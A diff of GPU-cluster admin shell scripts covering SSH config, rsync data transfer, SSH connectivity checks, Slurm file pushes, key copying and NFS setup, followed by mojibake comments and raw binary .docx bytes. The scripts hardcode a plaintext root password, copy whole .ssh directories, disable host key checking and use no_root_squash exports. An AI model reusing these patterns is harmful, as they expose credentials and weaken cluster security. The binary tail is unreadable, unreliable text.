+    # åŸå§‹è°ƒç”¨ç”¨æˆ·ä¸æ˜¯ root
+    echo "user name: $original_user"
+    cp "${conf_dir}/ubuntu_rsa/sshd_config" /etc/ssh/
+    cp "${conf_dir}/ubuntu_rsa/ssh_config" /etc/ssh/
+fi
 
-cp /data/apps/conf/rc.local /etc/rc.local
-
-chmod +x /etc/rc.local
-== /root/conf/trans-multi-domain.sh
-#!/bin/bash
-set -eo pipefail
-
-# ----------------------
-# é…ç½®å‚æ•°
-# ----------------------
-REMOTE_USER="ubuntu"
-REMOTE_HOST="49.235.160.237"
-REMOTE_PORT="22"
-SSH_KEY="/data/apps/id_rsa"
-
-SRC_HOME="/data/DeepSeek-R1"
-DEST_HOME="/data/DeepSeek-R1"
-SRC_SSD_HOME="/data/DeepSeek-R1"
-DEST_SSD_HOME="/data/DeepSeek-R1"
-
-DIRECTORIES=("$SRC_SSD_HOME")            # è¦åŒæ­¥çš„æœ¬åœ°ç›®å½•
-REMOTE_DIRECTORIES=("$DEST_SSD_HOME")    # å¯¹åº”çš„è¿œç¨‹ç›®å½•
-NUM_PROCESSES=8                          # å¹¶å‘è¿›ç¨‹æ•°
-MAX_RETRIES=3                            # æœ€å¤§é‡è¯•æ¬¡æ•°
-
-# ----------------------
-# åˆå§‹åŒ–å˜é‡
-# ----------------------
-declare -A TOTAL_SIZE                    # æ€»å¤§å°ç»Ÿè®¡ï¼ˆç›®å½•å => å­—èŠ‚æ•°ï¼‰
-declare -A COMPLETED_SIZE                # å·²å®Œæˆå¤§å°ç»Ÿè®¡
-TMP_DIR="/tmp/rsync_parallel_$$"         # ä¸´æ—¶ç›®å½•ï¼ˆè¿›ç¨‹éš”ç¦»ï¼‰
-mkdir -p "$TMP_DIR"
-
-# ----------------------
-== /root/conf/trans-progress.sh
-#!/bin/bash
-
-SOURCE="/mnt"     # æºç›®å½•
-DESTINATION="/data/mnt2"     # ç›®æ ‡ç›®å½•
-CHECK_INTERVAL=10              # æ£€æŸ¥é—´éš”ï¼ˆå•ä½ï¼šç§’ï¼‰
-
-# è·å–æºç›®å½•æ€»å¤§å°
-#TOTAL_SIZE_BYTES=$(du -sb $SOURCE | awk '{print $1}')
-TOTAL_SIZE_BYTES=7972457306496
-# æ ¼å¼åŒ–æ€»å¤§å°ä¸º TB
-TOTAL_SIZE_TB=$(echo "scale=2; $TOTAL_SIZE_BYTES / 1024 / 1024 / 1024 / 1024" | bc)
-
-start_time=$(date +%s)
-
-echo "å¼€å§‹ä¼ è¾“æ—¶é—´: $(date)"
-echo "æºç›®å½•å¤§å°: ${TOTAL_SIZE_TB}TB"
-
-while true; do
-  current_time=$(date +%s)
-  elapsed_time=$((current_time - start_time))
-
-  # è·å–å½“å‰å·²ç»ä¼ è¾“çš„å¤§å°
-  transferred_size=$(sudo du -sb $DESTINATION | awk '{print $1}')
-
-  # è®¡ç®—ä¼ è¾“é€Ÿåº¦
-  if [ $elapsed_time -gt 0 ]; then
-    speed=$((transferred_size / elapsed_time))
+# é‡å¯ sshd æœåŠ¡
+systemctl restart sshd
+--- /root/conf/para_ssh.sh
+#è¿ç»­çš„å†™æ³•
+#seq 107 125 | xargs -I{} -P 10 ssh para@10.251.10.{} "echo \$HOSTNAME && sudo ~/NVIDIA-Linux-x86_64-550.90.07.run --dkms -s;sudo update-initramfs -k $(uname -r) -c;sudo cp ~/conf/nv_gpu_conf.sh /usr/local/bin/;sudo /usr/local/bin/nv_gpu_conf.sh >/tmp/nv_gpu_conf.log 2>&1;sudo modprobe nvidia_peermem"
+#ç¦»æ•£çš„å†™æ³•
+#printf "2\n4\n7\n8\n88" | xargs -I{} -P5 ssh ubuntu@172.16.21.{} "echo \$HOSTNAME && ~/conf/grub.sh;sudo ~/conf/disableupdate.sh; sudo ~/conf/disablenouveau.sh; sudo ~/conf/cpu_performance.sh; ~/conf/install_build_essential.sh; sudo ~/conf/installpackage.sh"
+seq 6 70 | awk '$1 != 13 && $1 != 67' | \
+xargs -I{} -P20 sh -c '
+  ip={}
+  host="10.242.32.$ip"
+  if timeout 15 ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no root@$host "echo \$HOSTNAME && /root/conf/ids.sh" 2>/dev/null; then
+    echo "âœ… Success: $host"
   else
-    speed=0
+    echo "$ip" | flock /tmp/unreachable.lock tee -a /tmp/unreachable.txt >/dev/null
+    echo "âŒ Failed: $host"
   fi
-== /root/conf/trans_nodetonode.sh
+'
+
+--- /root/conf/ssh-ssh.sh
 #!/bin/bash
-set -e
-# å®šä¹‰ç›®æ ‡æœåŠ¡å™¨ä¿¡æ¯
-REMOTE_USER="root"
-REMOTE_HOST="172.16.21.76"
-REMOTE_PORT="22"
-SSH_KEY="/root/.ssh/id_rsa"  # æ·»åŠ å¯†é’¥è·¯å¾„
 
-# æœ¬åœ°ç›®å½•å’Œè¿œç¨‹ç›®æ ‡ç›®å½•çš„æ˜ å°„
-SRC_HOME="/ssd"
-DEST_HOME="/ssd"
+# å®šä¹‰èŠ‚ç‚¹èŒƒå›´
+START_NODE=1
+END_NODE=125
 
-# å®šä¹‰è¦æ‹·è´çš„ä¸»ç›®å½•
-DIRECTORIES=("$SRC_HOME")
-REMOTE_DIRECTORIES=("$DEST_HOME")
+# æ ¼å¼åŒ–èŠ‚ç‚¹åç§°
+NODES=$(seq -f "node%03g" $START_NODE $END_NODE)
 
-# éå†æ¯ä¸ªä¸»ç›®å½•ï¼Œå¯åŠ¨8ä¸ªå­è¿›ç¨‹
-for idx in ${!DIRECTORIES[@]}; do
-    SRC_DIR="${DIRECTORIES[$idx]}"
-    DEST_DIR="${REMOTE_DIRECTORIES[$idx]}"
+# è¾“å‡ºæµ‹è¯•ç»“æœçš„æ–‡ä»¶
+RESULT_FILE="ssh_test_results.log"
+> $RESULT_FILE  # æ¸…ç©ºæ—§ç»“æœ
 
-    # è·å–è¦åŒæ­¥çš„å­ç›®å½•å’Œæ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶åˆ†æˆ8ä»½
-    SUBDIRS=($(ls "$SRC_DIR"))
-    CHUNK_SIZE=$(( (${#SUBDIRS[@]} + 7) / 8 ))
-
-    for ((i = 0; i < ${#SUBDIRS[@]}; i += CHUNK_SIZE)); do
-        # å–å‡ºä¸€ä¸ªåˆ†å—
-        CHUNK=("${SUBDIRS[@]:i:CHUNK_SIZE}")
-
-        # æ„å»º rsync è¿‡æ»¤å‚æ•°ï¼ŒåŒ…å«å½“å‰åˆ†å—çš„å­ç›®å½•
-== /root/conf/trans_system_file.sh
-#æ‹·è´hostsæ–‡ä»¶ï¼š
-for i in {103..116}; do scp /etc/hosts ubuntu@172.22.64.${i}:/tmp && ssh ubuntu@172.22.64.${i} 'sudo mv /tmp/hosts /etc/hosts'; done	
-#æ‹·è´ssh_configå’Œsshd_configæ–‡ä»¶
-for i in {103..116}; do scp -rp /etc/ssh/{ssh_config,sshd_config} ubuntu@172.22.64.${i}:/tmp && ssh ubuntu@172.22.64.${i} 'sudo mv /tmp/{ssh_config,sshd_config} /etc/ssh;sudo systemctl restart sshd'; done
-#ä¿®æ”¹hostname
-for i in {103..109}; do ssh ubuntu@172.22.64.$i "sudo hostnamectl set-hostname g000$(expr $i - 100)"; donefor i in {110..116}; do ssh ubuntu@172.22.64.$i "sudo hostnamectl set-hostname g00$(expr $i - 100)"; done
-#æ‹·è´/etc/slurmä¸‹çš„æ–‡ä»¶
-for i in u{205..212};do scp -rp /etc/slurm/{cgroup.conf,gres.conf,slurm.conf} $i:/tmp && ssh $i 'sudo mv /tmp/{cgroup.conf,gres.conf,slurm.conf} /etc/slurm'; done
-#å•ç‹¬æ‹·è´slurm.confæ–‡ä»¶
-for i in u{205..212} u{401..406};do ssh $i 'echo $HOSTNAME;rm -rf /tmp/slurm.conf';done
-for i in u{205..212} u{401..406};do scp /etc/slurm/slurm.conf $i:/tmp && ssh $i 'sudo mv /tmp/slurm.conf /etc/slurm'; done
-#å•ç‹¬æ‹·è´/usr/share/modules/init/.modulespathæ–‡ä»¶
-for i in u{205..212} u{401..406};do scp /usr/share/modules/init/.modulespath $i:/tmp && ssh $i 'sudo mv /tmp/.modulespath  /usr/share/modules/init;source /usr/share/modules/init/profile.sh';done== /root/conf/ubuntu_copy_id_rsa.sh
+# å¼€å§‹æµ‹è¯•
+echo "å¼€å§‹æµ‹è¯•èŠ‚ç‚¹ä¹‹é—´çš„ SSH è¿é€šæ€§..."
+for NODE_A in $NODES; do
+    for NODE_B in $NODES; do
+        if [ "$NODE_A" != "$NODE_B" ]; then
+            # æµ‹è¯• SSH è¿é€šæ€§
+            ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_A "ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_B 'echo SUCCESS'" &> /dev/null
+            if [ $? -eq 0 ]; then
+                echo "$NODE_A -> $NODE_B: SUCCESS" >> $RESULT_FILE
+            else
+                echo "$NODE_A -> $NODE_B: FAILED" >> $RESULT_FILE
+            fi
+--- /root/conf/root_copy_id_rsa.sh
 #!/bin/bash
-apt-get install expect -y
-apt install python3 python3-pip -y
-pip3 install spawn
+#apt update -y
+#apt-get install expect -y
+#apt install python3 python3-pip -y
+#pip3 install spawn
 # å®šä¹‰ç›®æ ‡ä¸»æœºä¿¡æ¯
 declare -a hosts=(
-  "172.16.21.11"
-  "172.16.21.34"
-  "172.16.21.35"
+  "10.80.80.12"
+  "10.80.80.13"
+  "10.80.80.14"
 )
 
 # SSHå¯†ç 
-PASSWORD="ubuntu@"
+PASSWORD="Bingxing.2026"
 
 # æ‹·è´ .ssh ç›®å½•åˆ°æ¯ä¸ªç›®æ ‡ä¸»æœº
 for ip in "${hosts[@]}"; do
@@ -2924,224 +162,121 @@ for ip in "${hosts[@]}"; do
   
   expect << EOF
 set timeout 20
-spawn scp -r /home/ubuntu/.ssh ubuntu@$ip:/home/ubuntu
+spawn scp -r /root/.ssh root@$ip:/root
 expect {
   "yes/no" { send "yes\r"; exp_continue }
   "password:" { send "$PASSWORD\r" }
-}
-expect eof
-EOF
-
-  if [ $? -eq 0 ]; then
-    echo "æˆåŠŸæ‹·è´ .ssh ç›®å½•åˆ° $ip"
-== /root/conf/ubuntu_nfs.sh
+--- /root/conf/keygen.sh
 #!/bin/bash
-sudo apt-get -y install nfs-kernel-server
-#mkdir /ssd
-#sudo vim /etc/exports
-#exportsç¤ºä¾‹,ä¸»æœåŠ¡å™¨
-#æ•°æ®åŒæ­¥æ¨¡å¼ï¼Œå®‰å…¨æ€§é«˜
-#/data 10.31.17.0/32(rw,no_root_squash,insecure,sync,no_subtree_check)
-#æ•°æ®å¼‚æ­¥æ¨¡å¼ï¼Œå®‰å…¨æ€§ç•¥ä½ï¼Œä½†é«˜æ€§èƒ½
-#/ssd 10.242.32.1/24(rw,async,no_root_squash,insecure,no_subtree_check,fsid=0)
-#å®¢æˆ·ç«¯
-#æ™®é€šæ¨¡å¼
-#mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport   g0273:/ssd /data
-#å…¼å®¹é«˜æ€§èƒ½ + å®¢æˆ·ç«¯ soft æ¨¡å¼
-#mount -t nfs -o vers=3,proto=tcp,rsize=1048576,wsize=1048576,soft,timeo=100,retrans=2,noresvport 10.242.32.129:/ssd /data
-#é…ç½®æœåŠ¡
-sudo /etc/init.d/rpcbind restart
-sudo /etc/init.d/nfs-kernel-server restart
-sudo systemctl start  nfs-server
-sudo systemctl enable nfs-server
-sudo systemctl status nfs-server
-#å¦‚æœåœ¨å®¢æˆ·ç«¯å‡ºç°è¿™ç§stale file handleæƒ…å†µï¼Œå¯ä»¥åœ¨æœåŠ¡ç«¯é‡æ–°å¯åŠ¨nfsæœåŠ¡ï¼š
-#sudo /etc/init.d/rpcbind restart
-#sudo /etc/init.d/nfs-kernel-server restart
-#exportfs -ra
-#å®‰è£…ubuntu nfså®¢æˆ·ç«¯
-#apt -y install nfs-common
-#å®‰è£…centos nfsæœåŠ¡ä¸å®¢æˆ·ç«¯
-#yum install nfs-utils -y
-#éªŒè¯å®‰è£…
-#rpm -q nfs-utils
-== /root/conf/ubuntu_rsa
-== /root/conf/ubuntué—†å—™å…¢é–®ã„§è®².docx
-PK
-     ‡Nâ@            	   docProps/PK    ‡Nâ@}Ø³;       docProps/app.xmlQQo‚0|_²ÿ@ú-DM©q8Ÿ–ÌDœ¦)B-¡Ñ¿:3e¯{ûî.¹ïrÇç®õN0˜F«…A(©ËF3´+ÖşyÆ
-UŠV+ÈĞZğç'¶tƒmÀxÎB™ÕÖösŒ¬¡&p²rJ¥‡NX‡#ÖUÕHXiùÕ²˜2Áp¶ J(ışnˆnó“ı¯i©å5Ÿù(.½ÌÙFÁğ0aøv±½JÃ£Iì¨ÛÍòZBZ×i’¦Vh+Ú¢é€§1eøÙVŠr÷W¢5Àğƒ`oú4»¾Ğ+aáWÿKşî[o{!¯Q£	™Œ4¶ìû¶‘ÂºÍø~³õŞz=„4pá,"ô°_#š¾ä>Ìr?’Ò_†	õI’'1™Bó%Ãc'×Í}şPK    ‡Nâ@X”K  _     docProps/core.xml}’oKÃ0Æß~‡’÷mÒVæm‡Vß…ä¶›¤$™Ûüô¦]W'Š/s÷Üï»K6ÛÉ&ø ck­rG ¸µZçè¹œ‡SXÇ”`V£=X4+ÎÏ2ŞR®,nÁ¸làIÊRŞæ¨r®¥[^d6ò
-å“+m$sşiÖ¸eü­'„L°ÇswÀ°‰h@
->"Ûiz€à œÅqão­#íŸ}æD)k·oıLƒİS¶à‡ä¨ŞÙzn·Ûh›ö6¼ÿ¿.úQÃZu»â€ŠLğ¾å˜x =´;f^ÒÛ»rŠ„$iH.C’”$¡É%ä-ÃGÕPß,mŠk¿¾
-‚åã}§ÃİMfİÂŸoUƒ¸ÙŸ•Şdøw|´'íÿş.Â8	ãiO¨·˜NOüEßæç—(¾ PK    ‡Nâ@2D¸*       docProps/custom.xml¥‘Akƒ0Çïƒ}‡{LŒÚjQ‹ÆÆ+¬ëuHŒ­ ‰$±[ûîKéº±Ã.ÛññüŞï½—._‡…6’ô=\5Ügği»F1ÆÖ²©{%EOÂÀe~{“n´…¶0À!¤ÉàÁÚq±á1ÔÆs±tI«ôP[Wê=VmÛqQ)>BZL	™a>«4~áà…·8Ú¿"ÅÏvf·=N7O?á'Ğ¶k2øVE¬ª"!ºJò‰_¢$HæˆÄ„Ğ’²uR¬Ş!ÏÍYnõûÇ‡m&nË©ë›Ğ}´‹~|1Vç”DùÔs7ôü$ 4ÅßaŠ¯ÿ´	®6wl÷c<‹XPÑx‡´YTÄ%›­-‚y\0Ÿıà7!|¾Öå—ùPK
-     ‡Nâ@               word/PK    ‡Nâ@®ËŸÀ  æm     word/styles.xmlµ]İvÛ¸¾ï9}]µ%Y–lŸUö$rÜäl’ºk§{‘…I°ü‰â¼B/û}ƒ¾Mû€ E‹$$9¹‰%‘ß7Ì| Aüüôó÷Àw¾ñ82\&¯Æ#‡‡®ôDø´}y¼;»9IÊBù2äËÑ3OF?¿şã~Úİ$é³Ï Âä&p—£mšF7çç‰»åK^Éˆ‡ğãFÆKácüt°øk¹2ˆX*ÖÂéóùt<Œ\²8¼1gpc™ÈMªn¹‘›p¹ù¯¸#>…7¿óVºYÀÃT3ÇÜd˜lE”hŠ¸-@¾Ù
-ñ-ğ‹ëv§ídìE±ty’@~n|ÀDXÂLf5 Òq¯ÀqçyñÏÜ>ë¿*vLÆ6‹ÛÕİeâ×j;¯Åb³8¯f€ŠİQ²Ê’T·,e%Şn·{µ‹’WnhÌ®ÔÚäâ~Úß4r÷æÃS(c¶ö!8w“Ùè5D¦'İ[¾a™Ÿ&êc|›æ“şïN†iâìnXâ
-±=Š ‚ù3ß9¿Ê€sw7Û7aÒügIú&`õÿşıÏÿşç_êj7©ƒœ¿şé\óÿWìˆJ«ò«Œ†à„P}ÈsĞe¦ËÑt	
-ä›¿İé¼ZŠ/¾„[áñß¶<ü’prÙ\øÀñ^xWùm¾ûòá>2†ì[®¯Í—¥û•{)+Tå$?ñŞ}wy¤òhÿQpjœì€P’‰=²ş"©Ğë/B şge½?‚¢S²l9SJæLN!:´<7´€˜ö‡¸è1ëqÙbŞbÑâª?Äu#D¯À¡Ç¿·Ü ÀÍa8 psp Ü² 7ò ÀÍá= psĞ Üœ
- $H*]ŠôP°É¡`	RCÁ$†‚%HK
-– %,AB(X‚tÈ;BÎh6Âtøæh#eÊ”;)ÿN ÏB ×QDªûÅc¿PàæÍ¿é46š}Ğ‰nîuºL÷¹zÉzª”¹q6â)‹áa¾©Ş‹‡ß¸Oƒó<  dˆy
-£Ã¡Lš˜oxã!|xJæ²ø"äN˜kŠXØ8=­[„Î)(h¤±Ì4–¥[õ¬-(²-`0B6|t¦’96ë¥EBĞ)Tçmæûœ
-ü3QiË	ú®— óªqgÃÆ%è¾jÜ<2(ªğTŞ6ÖS9İÀSù>O2ßx*ßx*ßøfßtûŒ¸>ŠÔ'èÇ¬|©^L¯â)dĞ¿k¶ã˜|@×Á;÷,fO1‹¶z0¼ıo¥÷ì<’<u•ĞdZÓVàfÍĞ»àğdºPP)CI@¥%A³:ôªƒOğl¦:ğïÛŸ°1IÖò¾ç![§4ôÀü,‚>‡áÍ$AôïÓ÷NÄĞi¥ûiæ¡H·Ïj„IIK°/A'yN {ğ¼)|_ã (‡ï†Û³uâısÄcµø:|2ßIß—;îÙ),ËCË–Ñ€,ï‚hË‘ï°[3_ÆùÄ¢áÑï}˜ÒS½Ú¶wg0ÑÄw†ïB¶´nfÿO¿ñõŸ‡÷ÔûÇO70Î>TèTcµÚö•hiFLƒœHzíµ††ÇÂ $oÖ¿ğçµd0ÇªiD~hGİÃ°ª?”òfÂ^é§ËóÀ‚ˆâSƒ?B3±ƒ1UŠamMğwõªd°Ú¨N{r[¡{ù½òN!ÉÖ¿s—à±V›Êª*—â=ş|‚şŞ|‚®R¿òÌ×$™èğ’€ÌCE	È]Dğìl\$}o2Ÿ.JW]-tÕ ı,R'iJirQFª.Á(O
-‰…GWÃ¬z5:Yİjt²ŠÕè´µJ0/«3Ó³*è³´rt=|İ<é»W«‚NïÚv²x×èdñ®ÑÉâ]£“Å»F'‹wNï·ßl ¿OØW8Èb¿ÂA–ê
-"X3?7>İ ï|şÄ(^*ætËZ&Ã–%4A½°!}ÂËñÉB	†âèz<
-œÔr‚èË`ø–qÑ¼’Ş·êT9õ«J›‡cF{¾h®eìö£xÚ¦ÎÃ¶ÇË«¹^gÅWúóÌ|ªÖçYÁU7	~aÿÄ=‘…k°Ù4ŸNÌ©ùåq
-İ #»„sXŸÜZÆKkÿâ8¾~”ÀÚ‹¸Ù¯ñ±öë%¤-!jü£ñ‘²¶°­$½…5å>½¶Ü-xzÉÃÂ–Á%E"Ø’¸Äï!6÷¿OxKåÂ2´TØê"'ÒiÖ“ÅV9‹Ö,¶J9TÖ¾~ë"±}¹NÖÚ¾D'‹n_¢“Õ·/ÑÉ2Ü—èd=îItš0÷%±©B)oF¡ûrÙ´¡ä@„6y(‰†Ğ¡ÎâíØª©.ŞX[ÕÅËb«6ñÆraÄËÕY¼±DÅKÔY¼±DÅKÔY¼‘DİÄKbS…RçÄËeÓ†’«*ŞX"›<”DUñF>pQ´{È'¬G0ú²Ø*¨.ŞØ²Øj§M¼±\ñÆruo,QgñÆuo,QgñÆuo$Q7ñÆ’`ÄËeÓ†RS«â%²ÉCITo$QwñF¾—í(ŞX[ÕÅËb«6ñÆraÄËÕY¼±DÅKÔY¼±DÅKÔY¼‘DİÄK‚o,—MJM­Š7–È&%QU¼‘DİÅ9í¥£xcYlTo,‹­vÚÄË…o,WgñÆuo,QgñÆuo,QgñFuo,	F¼±\6m(5µ*ŞX"›<”DUñFuoä¬Ââe±UP]¼±,¶Úio,F¼±\ÅKÔY¼±DÅKÔY¼±DÅIÔM¼±$ñÆrÙ´¡ÔÔªxc‰lòPUÅ[Áö÷ÕìÕvïúÜ˜”ÂÎå(*¶áQS”`_{µk¿Ù¨^_øAoe¯îS+(ášo¨nûëÉ_9Ü
-{êµ³f±¬ş{¿}që8Ÿ)Ûï+ĞğäNM	¥pÅïnñÅZÂá …1·Á‘êîøÅ!z†ârˆPÆïÕÙªHúÆ_ŠCª?¾3¨;İ$USà[á‰ÜòäGa×ÔÌK~¬ÔIÚ3Sıª¡rê€öbİïîïª´pg‹ß/õ! U¿Ã*hUA›'Õêa?!ìÔj³[ÌMõŠÙvSóƒª¦š5ùzbjî¸„¨]ûyİÃ+îûŸ˜„TF`œè¡_·ç¡í}g9±Ï7işëd¬%õàwˆ/8£ışXOQÕğM àµª1ùGed»;_d]™gÓZ}ëµĞõÅâkGLüU	¡cÎ„aÍ¿]*XÖÿ°Êm*:#	Gk\OŒpµ]0¹º0oÙÚ®˜.ffFÛs˜­ªƒµíŠÙå•¶+.g×G,Ï&G,]\LXz5±vÄÒÉx¼8bêd|}}ÄÖÉä‚Úê´ÉÌ=rÉÅbvÌÜÙü²hSÀù:Zö­ƒÅªÑ[¡NP)TW–9úe†‹9ñeÿEqõáA/æ
-]ê¯<.3Á¡"Ñ¦Ü/$Ú|ç38šÄ¤Ï¾<(›öŒ?¶g«Ïê«5HÿrÄbåAHiİötMí‹Zj×÷,!Èê$b®:€
-¡6œĞË”Ş@Ãm.0->Û@ƒd4Tÿ}p‰ö7l±ª¾Í•ZÕßúçBâ¤£©Ín)¼óZíT÷:¨óP|’¸š~Êú¤Èi¶mQ³í`¥fóp±×UËŞ¡’uë2†wwyåfÅ—jÏÉ|wãÑ\®«z¹Ô>;«r‚r½ì/.G+™Å‚ÇêØ)•èF~¾İ+BUu*£¿î†B"’×ÿPK    ‡Nâ@¡
-8&Õ  .     word/settings.xml¥WIs›H¾OÕüw[ôBª()Ö$ÛÉDN\ö­…Z6ĞTƒŒå_?M²G=T¢‹š÷½}×ï><åÙÉ£PU*‹™ÎLãD‰\¦Åzf|¿Oã¤ªy±ä™,ÄÌØ‰ÊøğşÏ?Ş5ÓJÔ5°U' ¢¨¦y236u]N'“*ÙˆœWg²€+©r^Ã£ZOr®¶åi"ó’×é"ÍÒz7Á¦ÉŒAœ[UL§yš(YÉUİŠLåj•&bø%ÔÏØí%C™lsQÔÅ‰ø ‹j“–Õ¨-ÿUmâfTòøVy6ò5È|‹s·‘j¹—ø÷ZRÉDT(Ïúps{5ˆ)Ú§úR=émOZU Ìîtğ¼Êä5Õî«x‘.W}™¡^xQVÁ¶ªeòšïõ5MsÖ”ÕYRN¼¨"€BÆIL?¯©ø"ƒöl5ŞCo>K™Ÿ4ÓR¨ÊmšÆ¤t{(¯d=ß*%·Åò“à@öGQ½ÁKY1.‡úª LÚ~M¢€¦ODÛk{Ë´*3¾û$Uú,‹šg¡âÔç£J—Œànô õ®ü?„ªÓä¹ùu[$õ¶ëè¿„*@ó¿öC×faÙ†=•0×óMºª¿‰†®KPİ(^^‹§ú&­7Úô½¯j¯Jyá+Á¾m3Quø¶qtÁwr[¿âÿ\,!^uµÍB_×|1¯eÙ1õNÍûw	8\ğêØS‡÷Ã¥\
- ­J÷M2¾bş³i[®Ğo’xÈ¿ —21¯w™ˆ¡6óôYxÅòš3…7N—Óßğà-DÑZşoÊë])bÁ¡ğıõpß2Ö7ÎÒò2…ÖW}a~×Ø¤™¾ì¬äWUßdíñeIs	ß‘šïK#vçòîcöğù^¦W7?î¯>FO·yÔ\^ûw÷Ñîòæß>¯é-¾Ë¿„ç·ÏqzwŸ¤«¿g³6L°Ó7ÚƒoØ²3Ü¾Á¨`¿>3-z@H@cÓÒ Ä¶hlbE¾áaH_icÔµ	‰52vŠ‡N|%c‡ŒÚÌ×È84¢Ô^G¯d™.ÓióËvB¶€"j›:ßBä#/5„„à¸:Ä1Šíc™Ä´}W#ƒ°ƒL›éd¨M5¹Fãš­ÆãbÌü@ƒ„#Dœc›Øgq ©66„h<ÀÇ¶ki<ÀÈEš\cŒ¨iyß01CÁj|³<ÊÂ4C6
-MF±mÂlMå°íø6Š4½ƒí0ÄÖ!Šqàê|sÁeË×T·º¬EœHƒF#äFšú×³‘kr@|f3k*G‡1†4Ù!A5õğqFIìdz‘‰0‰t¥fH!Ş±Ea#¬É%1ÂÒxM-;f8Öicklj|£&ÄŒ5Õ¦®O¡@:;çÄtvB#+Òt< ®®¯-b¹È‰5¾Y–ç?ÒTÛrÂĞd‘f,ß%4r4^[q3ËÑLƒ›e–&f1‡YD“Ÿš¶¦˜ƒ!R[ÓoÌ‰fÚß˜ëìMµYˆ#bšÉb¡ï0déˆaÛÒÍM1¦¡«É›í8<M Pº¾›ø4¶ŸøæÓöfòUµ§…zğÓâ$ï7£…€%U´="óíbOO{ Êy–ÅŠ'#Ğ…‘OÛí4«N8»äj}Ğ;p(-u)Vç{]ír.ÔGØÂËŞZ‹g¿•Œæ¥ƒ¾´¨/Ò|¤WÛÅ|”*àvñ‚•şË£jNÁ7Ó.¥İvwÁ«±(N¿ÏÛ…DKíÌxŞœW­4ì5™š·wYqÉË²_¨k43²t½©Q+VÃÓî´İÃbw<µX÷À“6Xà-C®áp ‘‘F4¸±õ|ô@³Fšu ±‘wêfº­Reiñ «óxlé+™e²ËO#qf‘º.úïÿPK
-     ‡Nâ@               word/theme/PK    ‡Nâ@€Àÿ’  ˆ     word/theme/theme1.xmlíYOoE¿#ñF{oc'vGuªØ±hÓF±[Ôãxw¼;õìÎjfœÔ7Ô‘q 7¨ÔJ\Ê§	A‘úx3³»Ş‰×$*h­=û›÷ÿıæÍúêµ1C‡DHÊ“¶W¿\óI|Ğ$l{w†ıK’
-'f<!moF¤wmëİw®âM‘˜ ØŸÈMÜö"¥ÒÍ•éÃ2–—yJx6æ"Æ
-¾Šp%øäÆleµV[_‰1M<”àÄŞ©O¼­\lìDI½à31ĞBÉ"6˜Ô5BÎd—	tˆYÛ?’ÊCKÚ^Íüy+[WWğf¶‰©%{Kûúæ/Û—m&«F§G…Òz¿Ñº²SÈ7 ¦q½^¯Û«ò û>xjm)Ëlô7ê\f	d?.ÊîÖšµ†‹/É_[°¹Õétš­Ì+Ô€ìÇÆ~£¶ŞØ^uğdñÍ|£³İí®;x²øõ|ÿJk½áâ(b4™, uBûıLzs¶[	ß øF-ƒÏQPEuic¨eµãû\ô +š 5KÉûP¿]ÅZŞ$¸ôÄ.ùraIëBÒ4UmïıC/Ìå½~ñíëÏĞñÃçÇ8~ôèøá÷V³k'ay×«¯?ùıÉ‡è·g_½züY5^–ñ?÷ÑO?~Z„ö™›óòó§¿<úò‹ıæq|[àQ>¤1‘è9B<ÇLT\ËÉHœoÇ0Â´¼c;	%N°ÖR!¿§"}k†Y–Çq#xW }T¯Oï;"1U´Bó(v€{œ³•Q¸¡u•Â<œ&aµr1-ã0>¬ÒİÅ‰“ßŞ4ŞÌËÒq¼ÇÌ}†…C’…ô3>!¤Â»{”:qİ£¾à’ºGQÓÊéÈ©¦ù¦]C^fU>C¾ØìİEÎª¼Ş!‡.º³
-ã‡„9a¼§
-ÇU"‡8få€ßÄ*ª2r0~×“
-2ÆQ/ RVí¹-ÀßRÒo``¬Ê´ï±Yì"…¢“*™71çeäŸt#§UØM¢2ö=9ÅhŸ«*øw;D‡<àdiºïRâ¤ût6¸CCÇ¤yè'SQ‘Ëë„;õ;˜±1&†j€Ô®iògÄÍ(0·ÕpqÄTùòË'v¿©”½§WUÏì êe¸“ôÜå" o>;ïài²O !¨·äü–œ½ÿ<9/ëç‹§ä9AëYÄÚfì—NİcÊØ@Í¹)Íà-áì	ú°¨÷™»&)naiu'ƒ
-== /root/conf/ubuntué›†ç¾¤éƒ¨ç½².docx
-PK
-     ‡Nâ@            	   docProps/PK    ‡Nâ@íó:       docProps/app.xmlQAnÂ0¼Wê"ß'&I9F4”S¥"ÊYÎ†XMl+vü¾nQ!½ö¶;cÏŒféâÜwÁ	+µ*PÅ( %t-Õ±@»jNQ`W5ï´‚]À¢{| ›Aœx	eÔ:gæ[ÑBÏmäiå™F=w~X7°Òâ³å0‰ãÃÙª¡ÍM]ç'÷_ÑZ‹ï|ö½º˜Ñ?‚eÉÅ×‰îõP[6å_GZ¶|àÂù*ISÿrĞJ;ŞU²–ø÷nï ô^¬áŠï }•êÃîL¥WÜÁ/ÿ¹î¥k·†Ÿ“äÄ»ÜıG]ÓIÁ¿Ûo¶ÁÛO§‡„Dşx™$$;¬“—	yz.C’ÏÊ0du¸L2ÆY™¥ñ4I¹¤x¬ä{¹ÕÏ¾ PK    ‡Nâ@>\\J  _     docProps/core.xml}’oKÃ0Æß~‡’÷mÒ–¶Ã?‡‚Åw!¹­Å&)If7?½i×Õ‰"äMîûİs—dó­l‚0¶Ö*GqDP ŠkQ«uËExë˜¬Ñ
